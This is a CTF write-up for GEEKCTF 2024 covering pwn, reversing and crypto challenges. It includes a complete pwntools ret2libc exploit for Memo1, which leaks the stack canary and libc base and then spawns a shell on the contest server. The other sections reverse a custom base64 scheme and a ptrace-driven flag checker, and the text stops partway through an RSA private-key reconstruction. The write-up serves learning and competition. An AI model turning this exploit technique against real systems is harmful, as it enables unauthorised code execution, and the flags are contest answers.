# GEEKCTF 2024 Writeups
> Played as `Warri` and scored `36th` on the individual leaderboard with `1909` points. 

## Pwn
### Memo0 (102 Solves, 98 Pts)
---

Looking into the `login()` function we see that it calls `sub_12C9()` on user input and then checks if the user input string is `J8ITC7oaC7ofwTEbACM9zD4mC7oayqY9C7o9Kd==`. If it matches, it then prints the flag.

Looking into `sub_12C9()` we find the following decompiled pseudocode:
```cpp
  v15 = 4 * ((a2 + 2) / 3);
  v16 = malloc(v15 + 1);
  if ( !v16 )
    return 0LL;
  v13 = 0LL;
  v14 = 0LL;
  while ( v13 < a2 )
  {
    v3 = v13++;
    v10 = *(unsigned __int8 *)(a1 + v3);
    if ( v13 >= a2 )
    {
      v5 = 0;
    }
    else
    {
      v4 = v13++;
      v5 = *(unsigned __int8 *)(a1 + v4);
    }
    v11 = v5;
    if ( v13 >= a2 )
    {
      v7 = 0;
    }
    else
    {
      v6 = v13++;
      v7 = *(unsigned __int8 *)(a1 + v6);
    }
    v12 = (v11 << 8) + (v10 << 16) + v7;
    v16[v14] = aZyxwvutsrqponm[(v12 >> 18) & 0x3F];
    v16[v14 + 1] = aZyxwvutsrqponm[(v12 >> 12) & 0x3F];
    v16[v14 + 2] = aZyxwvutsrqponm[(v12 >> 6) & 0x3F];
    v8 = v14 + 3;
    v14 += 4LL;
    v16[v8] = aZyxwvutsrqponm[v12 & 0x3F];
  }
  for ( i = 0; i < (3 - a2 % 3) % 3; ++i )
    v16[v15 - i - 1] = 61;
  v16[v15] = 0;
  return v16;
}
```
Evidently we have a base64 encoder that operates on a custom base64 alphabet, `ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba9876543210+/`. We decode the user input via CyberChef to obtain the input string `CTF_is_interesting_isn0t_it?`. Interacting with the server with this as input grants us the flag,

```sh
warri> ncat chall.geekctf.geekcon.top 40310
libnsock ssl_init_helper(): OpenSSL legacy provider failed to load.

===================Memo Login===================
Please enter your password: CTF_is_interesting_isn0t_it?
Login Success!
flag{U_r_th3_ma5ter_0f_ba5e64}
```
### Memo1 (53 Solves, 174 Pts)
---
My First Canary + PIE Ret2Libc!

For starters seeing that the `libc.so.6` file is provided in the distribution, chances are it's some ret2libc challenge.

The typical ret2libc involves the idea of overwriting the stack, in order to manipulate the return address. The theoretical idea goes by replacing the return address to: (in downward order of the stack)

```sh
pointer to asm instructions containing `pop rdi; ret`
pointer to `/bin/sh` string
pointer to `system()` function call
```

We first set the return address to point to a `pop rdi; ret` instruction, followed by a pointer to a string parameter such as `/bin/sh` right after. That way, `pop rdi` pops the next value in the stack, the address of the `/bin/sh` string, into `rdi`. Afterwhich, the `ret` in `pop rdi; ret` checks the next value of the stack to return to, being the `system()` call with its first parameter (which is stored in the `rdi` register) being `/bin/sh`. This results in `system("/bin/sh")` being called effectively popping a shell for us to communicate.

We can find our `pop rdi; ret`, `/bin/sh` and `system()` addresses, otherwise called gadgets, using pwntools. We notice that all three of these can be found in the `libc.so.6` file which the executable will be linked to during runtime.

There are a few issues with this methodology. Lets quickly run `checksec` on `gdb` and we notice:

```sh
gef➤  checksec
[+] checksec for '/home/warri/memo1/memo1'
Canary                        : ✓
NX                            : ✓
PIE                           : ✓
Fortify                       : ✘
RelRO                         : Full
```

The main problems are the canary and the PIE.

A stack `canary` is a 8 byte field placed at the end of a stack frame. Whenever a function containing a canary ends, the program checks if the canary value is modified and raises an exception should it be modified. This is a protection against overflowing into the stack and overwriting the return addresses, which directly prevents our `ret2libc` idea.

`PIE` stands for `Position Independent Executable`, where when the binary `memo1` is loaded into memory, it will be loaded into a different memory address. This means we cannot hardcode values such as function addresses and gadget locations unless we figure out where they are while the executable is running.

`NX` stands for `No eXecute` which basically means all of our inputs will be stored as data and cannot be executed. It effectively neutralises shellcode, but we won't be using shellcode at all here.

`Full-Relro` makes the entire `got` section of a binary read-only, preventing one from overwriting the `got` address table to point to another function or a gadget that we'd like to run. The standard `ret2libc` attack typically does not write values into the `got` section, so this wouldn't matter as much.

`Fortify` (iirc) mainly detects for buffer overflows in functions such as `memcpy, mempcpy, memmove, memset, strcpy, stpcpy, strncpy, strcat, strncat, sprintf, vsprintf, snprintf, vsnprintf, gets.` Thankfully it is not enabled which could also imply a buffer overflow somewhere in the stack.

Onto the binary.

After we insert the same password as in `memo0`, we find ourselves able to control a 256-byte array. We can perform `Add Memo`, which allows us to write up until the 256th byte into the array, which also updates an integer value corresponding to its length, `Show Memo` which calls `puts(byte_array)` (i.e. prints values in the array till it hits a `NULL` byte) and `Edit Memo` which lets us edit `X` number of values in the array, and rewrites the first `X` values in the array accordingly. `Clean All` just wipes and reset the array.

Now in order to mitigate overflow attacks and prevent us from writing too much data into the byte array, which is stored as a local variable in `main()`, `edit_memo()` features the following:

```cpp
unsigned __int64 __fastcall sub_17F2(__int64 a1, unsigned __int64 a2)
{
  __int64 v3; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  printf("How many characters do you want to change:");
  __isoc99_scanf("%lld", &v3);
  if ( a2 > v3 )
  {
    sub_170E(a1, (unsigned int)v3);
    puts("Done!");
  }
  return v4 - __readfsqword(0x28u);
}
```
 A simple `a2 > v3` protection, where `a2` is an `unsigned int32` representing the length of the array. It first asks us for a number of characters to change, which it stores as a `signed int64` variable `v3`, then checks that `a2 > v3`, before calling `sub_170E()` with the byte array and `v3` as an `unsigned int32`.

```cpp
__int64 __fastcall sub_170E(__int64 a1, unsigned int a2)
{
  unsigned int i; // [rsp+1Ch] [rbp-4h]

  for ( i = 0; a2 > i; ++i )
  {
    read(0, (void *)((int)i + a1), 1uLL);
    if ( *(_BYTE *)((int)i + a1) == 10 )
    {
      *(_BYTE *)((int)i + a1) = 0;
      return i;
    }
  }
  return i;
}
```

`sub_170E()` is a simple function that writes up till `a2` (or in the context of `edit_memo()`, `v3` bytes into the array) , and if it detects a newline (`\n`) character, changes it to a NULL (`\x00`) character and terminates.

Now, in order to perform `ret2libc` we first need to overwrite the return address of the stack frame, which requires first bypassing the canary that protects said address and subsequent values down the stack. As the stack canary is typically random and starts with a NULL byte, we have to leak it somehow. `Show Memo` could help, where if we write in a certain number of characters into the byte array, such that the next byte would be the first non-NULL byte of the stack canary, we can obtain the subsequent 7 bytes of the canary and piece it together!

A quick runthrough reveals that the `265th` byte of the byte array that we can overwrite will result in the first byte of the canary to be affected, leading to a `stack smashing detected` error (i.e. canary has been modified).

Consider the `edit_memo()` function, where we enter the number `-4294967293` when prompted for number of bytes to write in. Due to the way `cpp/c` stores signed integers, this is stored as `0xffffffff00000003`. Now, the `if (a2 > v3)` check would return True, as so long as `a2 >= 0` (its default value would be 0), v3 being typecasted as a `signed int64` would cause the program to treat it as a negative number instead of `18446744069414584323`!

This then goes into the `sub_170E()` call. Now, because said call typecasts `v3` as a `unsigned int32`, due to the way integers are stored (little endian), only the first 4 bytes of `v3` is taken to be interpreted as an integer. In this case, it would be `0x00000003`. And so exactly 3 bytes would be read in!

In fact, in order to write exactly `X` bytes without the `\n` getting in the way, we just need to input `(0xffffffff00000000 + X - 1) - 0xffffffffffffffff` in `edit_memo()`. And so we use it to write exactly `265` bytes in, allowing `Show Memo` to display the canary string. With the canary string, it becomes trivial to overflow past it, and then restore the canary whenever we need to.

With the canary bypassed, due to `PIE` however we now need to leak information regarding where the `libc` data is stored in. Notice that `Show Memo` is done in `main()`, and the return address of `main()` will be some instruction address in `__libc_start_main()`. By writing enough values in past the canary, we can use `Show Memo` to leak said address, allowing us to then get the base libc address, i.e. the address where the libc and the rest of its data is loaded in. That way, if we know that the string `/bin/sh` is located at an offset of `0xaabb` from the `libc.so.6` file, knowing the base libc, `base_libc + 0xaabb` would be where the string is loaded in the memory!

Thus, we can now perform our `ret2libc` attack, having overcome both the stack canary and the PIE. Note that our attack involves an additional `ret` gadget from the `libc`, 

whereby instead of the usual `<OVERFLOW_DATA> | 8_byte_canary | 8_byte_rbp | pop rdi, ret; | "/bin/sh" | system()`

, we have `<OVERFLOW_DATA> | 8_byte_canary | 8_byte_rbp | pop rdi, ret; | "/bin/sh" | ret; | system()`. This is because `system()` has a `movabs` call which produces an error in the event that the stack is misaligned, i.e. its offsetted by 8 bytes. In the case of this binary, the stack would not be "in phase" or aligned for `movabs` after the standard `pop rdi, ret;` `/bin/sh`. The additional 8 bytes of the `ret` gadget shifts our stack to be aligned with it so that `movabs` won't generate an error.

```py
from pwn import process, gdb, ELF, ROP, p64, remote

def write_vals(p, num, pload=None):
    p.sendline(b'3')
    p.sendline(str((0xffffffff00000000 + num - 1) - 0xffffffffffffffff).encode())
    if not pload:
        pload = b'A'*num
    p.sendline(pload)

# Get offsets
libc = ELF("libc.so.6")
rop = ROP(libc)

LIBC_START_MAIN = libc.symbols['__libc_start_main']
SYSTEM = libc.symbols["system"]
BIN_SH = next(libc.search(b"/bin/sh"))
POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
RET = rop.find_gadget(['ret'])[0]

print(f'libc_start_call_main offset: {hex(LIBC_START_MAIN)}')
print(f'system offset: {hex(SYSTEM)}')
print(f'binsh offset: {hex(BIN_SH)}')
print(f'pop rdi: {hex(POP_RDI)}')
print(f'ret: {hex(RET)}')

p = remote('chall.geekctf.geekcon.top', 40311) #process('./memo1')

# gdb_offset = 0x1a08 - 0x1603
# gdb_leave_offset = 0x1a77 - 0x1603
# gdb.attach(p, gdbscript=f"""
# b *login+{gdb_offset}
# b *login+{gdb_leave_offset}
# """) 
# # some gdb breakpoints to see the stack during local testing

# Lets get the canary!
p.sendline(b'CTF_is_interesting_isn0t_it?')
p.recvuntil(b'Your choice:')
write_vals(p, 265)
p.recvuntil(b'Your choice:')
p.sendline(b'2')
p.recvline() # Content:\n
line = p.recvline().rstrip() # remove b'\n'
print(line)
assert line[-1] == 1 
# else unlucky, canary has \n or null byte. The 1 means the last byte contains the `rbp` value after the canary. Local testing indicates that the value ought to be \x01

canary = b'\x00' + line[-8:-1] # since linux canaries start with NULL byte
print(f'canary: {canary}')

# Now we get the libc base
p.recvuntil(b'Your choice:')
write_vals(p, 264+8+8)
p.recvuntil(b'Your choice:')
p.sendline(b'2')
p.recvline()
line = p.recvline().rstrip()
ret_addr = int.from_bytes(line[264+8+8:], "little")
print(f'ret_addr: {hex(ret_addr)}')
libc_start_main_addr = ret_addr + (0xc0 - 0x90) # offset deduced by local testing
print(f'libc_start_main_addr: {hex(libc_start_main_addr)}')
libc_base = libc_start_main_addr - LIBC_START_MAIN
print(f'libc_base: {hex(libc_base)}')

# With both of these we can construct our ret2libc payload...
system_addr = libc_base + SYSTEM
bin_sh_addr = libc_base + BIN_SH
pop_rdi_addr = libc_base + POP_RDI
ret_addr = libc_base + RET

payload = b'A'*(264+8+8) + p64(pop_rdi_addr) + p64(bin_sh_addr) \
        + p64(ret_addr) + p64(system_addr)
# note ret; gadget is for movabs stack realignment

# and now we insert our malicious payload in to pop a shell once main() is done running!
p.recvuntil(b'Your choice:')
write_vals(p, len(payload), payload) 

# To restore canary:
def restore_canary(p, canary):
    p.recvuntil(b'Your choice:')
    p.sendline(b'3')
    p.sendline(b'-1')
    p.sendline(b'A'*265 + canary[1:])

    p.recvuntil(b'Your choice:')
    p.sendline(b'3')
    p.sendline(b'-1')
    p.sendline(b'A'*264) # restores the NULL byte at the start of the canary

# Now we restore the canary back to what it was to silence it
restore_canary(p, canary)
p.interactive()
```

And thus, upon running we let the `main()` function end, gracefully calling `pop rdi;ret;` on `/bin/sh` into a `ret;` into `system()` with `/bin/sh` as the input parameter, thereby popping a shell for us to play around with:

```sh
[*] Loaded 219 cached gadgets for 'libc.so.6'
libc_start_call_main offset: 0x29dc0
system offset: 0x50d70
binsh offset: 0x1d8678
pop rdi: 0x2a3e5
ret: 0x29139
[+] Opening connection to chall.geekctf.geekcon.top on port 40311: Done
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1\xcc\xed\x13~\xd1\xb6\x01'
canary: b'\x001\xcc\xed\x13~\xd1\xb6'
ret_addr: 0x7effa533ad90
libc_start_main_addr: 0x7effa533adc0
libc_base: 0x7effa5311000
[*] Switching to interactive mode
How many characters do you want to change:Done!
===================Memo 1.0===================
1. Add  Memo
2. Show Memo
3. Edit Memo
4. Clean All
Your choice:$ ls
Error Choice!
/bin/sh: 1: s: not found
$ ls
flag
memo1
$ cat flag
flag{5t4ck_0v3rfl0w_1s_d4ng3r0u5_233}
$
[*] Interrupted
[*] Closed connection to chall.geekctf.geekcon.top port 40311
```
`flag{5t4ck_0v3rfl0w_1s_d4ng3r0u5_233}`
<div style="page-break-after: always;"></div>


## Rev
### Peer-Trace (28 Solves, 289 Pts)
---
We are given two files, `peer` and `puppet`.

`puppet` appears to be a simple flag checker that xors the user input with `0x28` and checks if its equal to a specific string:
```cpp
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int i; // [rsp+4h] [rbp-5Ch]
  ssize_t v5; // [rsp+8h] [rbp-58h]
  char buf[72]; // [rsp+10h] [rbp-50h] BYREF
  unsigned __int64 v7; // [rsp+58h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  puts("I'm a flag checker, give me your flag and I'll check it for you. ");
  printf("Input your flag here: ");
  fflush(stdout);
  v5 = read(0, buf, 0x30uLL);
  if ( v5 <= 0 )
    puts("No flag to check. Good byte~");
  if ( v5 != 48 )
    puts("Flag length mismatch.");
  for ( i = 0; v5 > i; ++i )
    buf[i] ^= 40u;
  if ( !memcmp(buf, &ct, 0x30uLL) )
    puts("Passed");
  else
    puts("Invalid");
  return 0;
}
```

But if we reverse it from here, we'd find that the flag is invalid; Its hardly valid ASCII, let alone contain the flag header! Something's off here.

So we open `peer` in IDA, and notice that it makes...a lot of `ptrace()` calls.

```cpp
  v22 = __readfsqword(0x28u);
  forked_pid = fork();
  if ( !forked_pid )
  {
    ptrace(PTRACE_TRACEME, 0LL, 0LL, 0LL);
    execl("puppet", "puppet", 0LL);
  }
  wait((__WAIT_STATUS)&stat_loc);
  if ( ((__int64)stat_loc.__uptr & 0x7F) == 0 )
    return 0;
  ptrace(PTRACE_SYSCALL, forked_pid, 0LL, 0LL);
  HIDWORD(stat_loc.__iptr) = 0;
  userBuffer = 0LL;
```
We first note `peer` calling `puppet` with `PTRACE_SYSCALL`. As it would turn out, `ptrace()` possesses a rather diverse range of utility on Linux, and we can deduce what each `ptrace()` call is doing from here: `https://man7.org/linux/man-pages/man2/ptrace.2.html`

```cpp
  while ( 1 )
  {
    wait((__WAIT_STATUS)&stat_loc);
    if ( ((__int64)stat_loc.__uptr & 0x7F) == 0 )
      break;
    if ( !ptrace(PTRACE_PEEKUSER, forked_pid, 120LL, 0LL) )// USER area offset 120
                                                           // returns 0xc
    {
      ptrace(PTRACE_GETREGS, forked_pid, 0LL, &registers);
      if ( HIDWORD(stat_loc.__iptr) )
      {
        if ( userBuffer && registers.rax )
        {
          v12 = 8 * ((registers.rax >> 3) + 1);
          for ( i = 0; (__int64)(v12 + 6) >= i; i += 8 )
          {
            *(_QWORD *)qword_data = ptrace(PTRACE_PEEKDATA, forked_pid, &userBuffer[i], 0LL);// (INST, PID, ADDR, data)
                                                // returns a word at ADDR
            *(_QWORD *)buff = *(_QWORD *)qword_data;
            v13 = qword_data[0];
            buff[0] = qword_data[5];
            buff[5] = qword_data[0];
            v14 = qword_data[1];
            buff[1] = qword_data[7];
            buff[7] = qword_data[1];
            v15 = qword_data[2];
            buff[2] = qword_data[6];
            buff[6] = qword_data[2];
            for ( j = 0; i + j < registers.rax && j <= 7; ++j )
              buff[j] -= j + i;
            tmp0 = buff[3];
            buff[3] = buff[4];
            buff[4] = tmp0;
            ptrace(PTRACE_POKEDATA, forked_pid, &userBuffer[i], *(_QWORD *)buff);
          }
          userBuffer = 0LL;
          break;
        }
        HIDWORD(stat_loc.__iptr) = 0;
      }
      else
      {
        HIDWORD(stat_loc.__iptr) = 1;
        if ( !registers.rdi )                   // right where puppet calls read()
          userBuffer = (char *)registers.rsi;
      }
    }
    ptrace(PTRACE_SYSCALL, forked_pid, 0LL, 0LL);
  }
```
We notice that in each iteration of the while loop, `peer` gets the register data of the `puppet` process. More particularly, at te entry and exit of various system calls `peer` "pauses" the `puppet` process, checks if `rdi` is empty, sets a `userBuffer` object to `rsi`, and then in the next iteration performs a shuffling on the array that is held in `rsi`. `PEEKDATA` and `POKEDATA` are being used here to read and write data to the executable respectively, after which the loop ends.

Looking through the assembly code for `puppet`, we notice the first instance in `main()` where `rdi` is empty;

```
48 89 C7          mov     rdi, rax        ; stream
E8 BA FE FF FF    call    _fflush
48 8D 45 B0       lea     rax, [rbp+buf]
BA 30 00 00 00    mov     edx, 30h ; '0'  ; nbytes
48 89 C6          mov     rsi, rax        ; buf
BF 00 00 00 00    mov     edi, 0          ; fd
E8 84 FE FF FF    call    _read
48 89 45 A8       mov     [rbp+var_58], rax
48 83 7D A8 00    cmp     [rbp+var_58], 0
7F 0F             jg      short loc_1266
```

We see that when `rdi` contains 0, `puppet` is right before calling `_read()`. `peer` sets its `userBuffer[]` variable to `registers.rsi`. At this moment, `rsi` contains the buffer that would later store the user input.

In the next iteration, which would occur at the end of the `_read()` call, `PTRACE_GETREGS` updates `registers.rsi`, which would contain the user input as is `_read()`'s documentation. `registers.rax` would contain the length of the user input as well. As `userBuffer[]` is pointing to the same location as `registers.rsi`, it too will now contain the user input, leading into the shuffling and subtracting algorithm where all of the user input is shuffled and subtracted in chunks of 8 bytes before the loop breaks. We see that `peer` modifies the user input string, even before `puppet()` could perform the xor decryption.

```cpp
  ptrace(PTRACE_SINGLESTEP, forked_pid, 0LL, 0LL);// after read()
  v9 = 0;
  *(_QWORD *)buff = 0xA39C3E6994313F40LL;
  *(_QWORD *)&buff[8] = 0x17872470565B9B60LL;
  *(_QWORD *)&buff[16] = 0x11A918AABA97CA68LL;
  *(_QWORD *)&buff[24] = 0xB8F1B0AB9B3DD3B0LL;
  *(_QWORD *)&buff[32] = 0x488749FB6A1835E4LL;
  *(_QWORD *)&buff[40] = 0x82926F78FE98158LL;
  while ( 1 )
  {
    wait((__WAIT_STATUS)&stat_loc);
    if ( ((__int64)stat_loc.__uptr & 0x7F) == 0 )
      break;
    v17 = ptrace(PTRACE_PEEKUSER, forked_pid, 128LL, 0LL);
    v18 = ptrace(PTRACE_PEEKDATA, forked_pid, v17, 0LL);
    if ( (v17 & 0xFFF) == 658 && (v18 & 0xFFFFFFFFFFLL) == 0xA4458BC289LL )
    {
      ptrace(PTRACE_GETREGS, forked_pid, 0LL, &registers);
      v19 = (unsigned int)ptrace(PTRACE_PEEKDATA, forked_pid, registers.rbp - 92, 0LL);
      registers.rax = LODWORD(registers.rax) + (unsigned __int64)(unsigned __int8)buff[v19];
      ptrace(PTRACE_SETREGS, forked_pid, 0LL, &registers);
      v9 = 1;
    }
    ptrace(PTRACE_SINGLESTEP, forked_pid, 0LL, 0LL);
  }
  do
  {
    ptrace(PTRACE_CONT, forked_pid, 0LL, 0LL);
    wait((__WAIT_STATUS)&stat_loc);
  }
  while ( ((__int64)stat_loc.__uptr & 0x7F) != 0 );
  return 0;
}
```

This is followed by multiple `PTRACE_SINGLESTEP`s which go into each assembly instruction. `peer` waits till some condition in the program's execution, then overwrites the current `rax` register in `puppet` to  `rax + buff[rbp - 92]`. It is implied to have done this for each character in `buff`. Interestingly, that's the same as `48`, a specific length that `puppet` checks for during input validation...

Looking through `puppet`'s relatively short assembly, we see:
```
8B 45 A4          mov     eax, [rbp-92]
48 98             cdqe
0F B6 44 05 B0    movzx   eax, [rbp+rax+buf]
83 F0 28          xor     eax, 40
89 C2             mov     edx, eax
8B 45 A4          mov     eax, [rbp-92]
48 98             cdqe
88 54 05 B0       mov     [rbp+rax+buf], dl
83 45 A4 01       add     [rbp+var_5C], 1
```
This is where each character in the user input is xored with `40`. We observe that `rbp-92` would contain the index of the user input buffer. This gives us more than enough information to guess what's going on - Either before or after `xor eax, 40`, the relevant byte in `rax` i.e. user input buffer is further added by some value.

Now we just incorporate `peer`'s changes to `puppet` and reverse the flag checker to obtain the flag:

```py
from Crypto.Util.strxor import strxor

def sub(a,b):
    return [(i-j) % 256 for i,j in zip(a,b)]

ct = bytes.fromhex("9C5689F3B5870FF0D19B6CA4D1A2003581D4B030F3890A891345A008CA1F0F20004F5681035BABC3C7FD57BB093B9508")
a1 = bytes.fromhex("A39C3E6994313F40")[::-1] 
a2 = bytes.fromhex("17872470565B9B60")[::-1] 
a3 = bytes.fromhex("11A918AABA97CA68")[::-1] 
a4 = bytes.fromhex("B8F1B0AB9B3DD3B0")[::-1] 
a5 = bytes.fromhex("488749FB6A1835E4")[::-1] 
a6 = bytes.fromhex("082926F78FE98158")[::-1] 
a = b''.join([a1,a2,a3,a4,a5,a6])

def inv_swapp(s):
    s = list(s)
    for _ in range(0,len(s),8):
        tmp3 = s[3+_]
        s[3+_] = s[4+_]
        s[4+_] = tmp3
        for j in range(0, 8):
            s[j+_] += j+_
        tmp = s[0+_]
        s[0+_] = s[5+_]
        s[5+_] = tmp
        tmp1 = s[1+_]
        s[1+_] = s[7+_]
        s[7+_] = tmp1
        tmp2 = s[2+_]
        s[2+_] = s[6+_]
        s[6+_] = tmp2
    return bytes(s)

c1 = sub(ct, a)
c1 = strxor(bytes(c1), bytes([40]*len(c1)))
print(inv_swapp(c1))
```
`flag{tr@cE_TraC1ng_trAC3d_TRaces_z2CcT8SjWre0op}`
<div style="page-break-after: always;"></div>

## Crypto
The category that I play the most in...yet I could only solve 1 challenge...
### SpARse (6 Solves, 687 Pts)
---
This was a rather interesting `RSA` challenge.
We are given a private key `pem` file, except it is incomplete:
```txt
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAz3om77jpWFrtAUZNPT29TYCIJzH8LTGyjZT4nuEUyGOpBXdR
IaC46+jVBpkrk4vMGARJPw1j6hWM50WlI8Qq/siRU3ut2hXDeoLHugxJZEkDsRxC
N26kHBMZNs5PQWKLHM1P4p70jVrfzrI7NluKnqiwLMXWP+93iUdx1OIuB3Rl/SCd
/FPhy4t9dvZBYNkuHQKjY+AqandWqJLkGjJpn3K8EV036g9FchQG74cx1JXrFJu0
LqAMo0qv8XqhMItDGnjx0cvFzqhVp3gg/xx3KT4++PkvLJiRNHVlQGECt1tdqsoP
6wWd5RRxQlOcqkZZ8Ynpc0VVfI0xi+F7ELCk+QIDAQA?A??BA?3?a?????3??4?Y
?a??????????n????C?y???P??a?4?rX??p?6?????????x???rzz?c?X???????
???????yp????c??Fs????????????????????jM??????5?aGv?A?????tCD?L?
??pYzs???f?li???F?????????vk?????c?????uS????????Z??E???????????
?????GJ?????hh??/?yX??C??p???X?????s??Wv?N4?7P???????o?W?????r2?
?s?6?L?????Y???????????s?EXs????7?K?????R???p????GBQ??I?u?????11
???Y??????EA???i??aS???j??l?????????y???t?f?F?H9??i4??0???????q?
8e??Y?????v??????Q???????????DLUk??M????????F???????K??U??tQ?5?r
Cl????7????T?????4?7BzRd????7W??????0???M????i?Z??w???c???E??UV?
???????b?g??h?5???????????????Ab?????Bo?q?I??????iMt???????Gq???
??Vx??????????????Gk?c??????0???c?mz?6?????3?4z??iXp?f??i??sbI??
???vA2JV?J?Per??????0???????????Q???cX??gYB??????2?e????J?d?3?y?
9?????D??????h????EmA1Y?csU???D?z?u??9??R?S9J4eyT?????j?V1??g?t?
Sd?????b????p????????/z??f?G?i?/V???q?D7???J?G?I?B?L?????Q????9?
/???e?e???7Z?0??7j??9Q??g????/?f??7d?????q?5???m????????????????
?s???b??u??Py???x??d?????r??????j?z????tB?G?7z?????yQ?ui?????t??
??????H?BI0???mp???HO???????Z??VK??H???????W?????V?E??Z?g????M?1
????????????????????????????????????????????????????????????????
????????????????????????????????????????????????????????????????
????????????????????????????????????????????????????
-----END RSA PRIVATE KEY-----
```

We are told that the flag is obtained upon reconstructing the original `private.pem` file, and then running `md5sum privkey.pem | awk '{print "flag{"$1"}"}'` to obtain the flag.

Lets first decode what we know from the base64 encoded string;
```py
ss = """MII.....???"""
ss = ''.join(ss.split('\n'))

ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

def decode_parital_b64(s):
    out = ""
    for i in s:
        if i in ALPHABET:
            out += format(ALPHABET.index(i), '06b')
        else:
            out += '?'*6
    return out

partial_pt = decode_parital_b64(ss)

hex_pt = ""
for i in range(0,len(partial_pt),4):
    hex_block = partial_pt[i:i+4]
    if '?' in hex_block:
        hex_pt += "?"
    else:
        hex_pt += hex(int(hex_block, 2))[2:]

# Output formatting purposes
for i in range(0,len(hex_pt),32):
    blk = hex_pt[i:i+32]
    for j in range(0,len(blk),2):
        print(blk[j:j+2],end=" ")
    print()
```

Giving us,
```
30 82 04 a3 02 01 00 02 82 01 01 00 cf 7a 26 ef 
b8 e9 58 5a ed 01 46 4d 3d 3d bd 4d 80 88 27 31 
fc 2d 31 b2 8d 94 f8 9e e1 14 c8 63 a9 05 77 51 
21 a0 b8 eb e8 d5 06 99 2b 93 8b cc 18 04 49 3f 
0d 63 ea 15 8c e7 45 a5 23 c4 2a fe c8 91 53 7b 
ad da 15 c3 7a 82 c7 ba 0c 49 64 49 03 b1 1c 42 
37 6e a4 1c 13 19 36 ce 4f 41 62 8b 1c cd 4f e2 
9e f4 8d 5a df ce b2 3b 36 5b 8a 9e a8 b0 2c c5 
d6 3f ef 77 89 47 71 d4 e2 2e 07 74 65 fd 20 9d 
fc 53 e1 cb 8b 7d 76 f6 41 60 d9 2e 1d 02 a3 63 
e0 2a 6a 77 56 a8 92 e4 1a 32 69 9f 72 bc 11 5d 
37 ea 0f 45 72 14 06 ef 87 31 d4 95 eb 14 9b b4 
2e a0 0c a3 4a af f1 7a a1 30 8b 43 1a 78 f1 d1 
cb c5 ce a8 55 a7 78 20 ff 1c 77 29 3e 3e f8 f9
2f 2c 98 91 34 75 65 40 61 02 b7 5b 5d aa ca 0f
eb 05 9d e5 14 71 42 53 9c aa 46 59 f1 89 e9 73
45 55 7c 8d 31 8b e1 7b 10 b0 a4 f9 02 03 01 00
?? 0? ?? ?1 0? ?d ?? 6? ?? ?? ?? ?d ?? ?? 8? ?8
?? a? ?? ?? ?? ?? ?? ?? ?? 9? ?? ?? ?? 2? ?2 ??
?? ?f ?? ?6 ?? e? ?a d7 ?? ?a ?? e? ?? ?? ?? ??
?? ?? ?c ?? ?? ?a f3 c? ?7 ?? 5? ?? ?? ?? ?? ??
?? ?? ?? ?? ?? ?2 a? ?? ?? ?? c? ?? 16 c? ?? ??
?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?8 cc ?? ??
?? ?? ?e ?? 68 6b ?? 0? ?? ?? ?? ?b 42 0? ?2 ??
?? ?a 58 ce c? ?? ?? f? ?5 8? ?? ?? 1? ?? ?? ??
?? ?? ?? ?b e4 ?? ?? ?? ?? c? ?? ?? ?? ?e 4? ??
?? ?? ?? ?? ?? 9? ?? 1? ?? ?? ?? ?? ?? ?? ?? ??
?? ?? ?? ?? 62 ?? ?? ?? ?? 86 1? ?? f? ?c 97 ??
?0 ?? ?? 9? ?? ?? 7? ?? ?? ?? ?c ?? ?5 af ?? de
?? ec f? ?? ?? ?? ?? ?? 8? ?6 ?? ?? ?? ?? bd ??
?? c? ?a ?? b? ?? ?? ?? ?8 ?? ?? ?? ?? ?? ?? ??
?? ?c ?? 45 ec ?? ?? ?? e? ?2 ?? ?? ?? ?? 4? ??
?? a? ?? ?? ?? 60 50 ?? ?2 ?? b? ?? ?? ?? ?d 75
?? ?? ?8 ?? ?? ?? ?? ?1 00 ?? ?? ?2 ?? ?6 92 ??
?? ?3 ?? ?9 ?? ?? ?? ?? ?? ?? ?? c? ?? ?? b? ?7
?? 1? ?1 fd ?? ?8 b8 ?? ?d ?? ?? ?? ?? ?? ?a ??
f1 e? ?? 6? ?? ?? ?? ?b ?? ?? ?? ?? ?? 0? ?? ??
?? ?? ?? ?? ?? ?? 32 d4 9? ?? ?c ?? ?? ?? ?? ??
?? 1? ?? ?? ?? ?? ?? 2? ?? ?4 ?? ?b 50 ?? 9? ?b
0a 5? ?? ?? ?e ?? ?? ?? ?3 ?? ?? ?? ?? 8? ?b 07
34 5d ?? ?? ?? ed 6? ?? ?? ?? ?? d? ?? ?? 3? ??
?? ?? 2? ?9 ?? ?c ?? ?? ?7 ?? ?? ?1 ?? ?? 45 ??
?? ?? ?? ?? ?? ?b ?? 0? ?? 8? ?e ?? ?? ?? ?? ??
?? ?? ?? ?? ?? ?? ?0 1b ?? ?? ?? ?? 1a ?? a? ?2
?? ?? ?? ?? ?? 23 2d ?? ?? ?? ?? ?? ?6 a? ?? ??
?? ?5 71 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?1 a4 ??
c? ?? ?? ?? ?? d? ?? ?? 7? ?9 b3 ?? a? ?? ?? ??
?7 ?? 8c ?? ?? 25 e9 ?? f? ?? 8? ?? ?c 6c 8? ??
?? ?? ?f 03 62 55 ?? 9? ?f 7a b? ?? ?? ?? ?? d?
?? ?? ?? ?? ?? ?? ?? ?? 4? ?? ?? 71 7? ?? 81 80
?? ?? ?? ?? ?? 6? ?e ?? ?? ?? 2? ?7 ?? d? ?c ??
